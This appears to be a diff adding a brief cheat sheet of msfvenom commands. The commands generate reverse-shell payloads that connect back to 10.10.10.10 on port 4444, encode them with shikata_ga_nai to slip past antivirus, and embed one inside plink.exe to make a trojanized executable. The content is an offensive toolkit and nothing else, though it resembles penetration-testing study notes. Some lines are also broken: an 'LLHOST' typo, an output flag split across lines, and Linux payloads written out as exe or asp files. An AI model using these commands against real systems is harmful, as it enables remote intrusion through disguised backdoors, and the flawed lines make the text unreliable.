@@ -1,0 +1,13 @@
+# List payloads
+msfvenom -l
+
+# Create a payload
+msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o reverse_shell.exe
+msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f asp -o reverse_shell.asp
+
+# Create an encoded payload
+msfvenom -p linux/x86/shell/reverse_tcp LLHOST=10.10.10.101 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 5 -o reverse_shell_encoded.exe
+
+# Inject an encoded payload to an executable
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 5 -x /usr/share/windows-binaries/plink.exe -o
+reverse_shell_encoded_embedded.exe
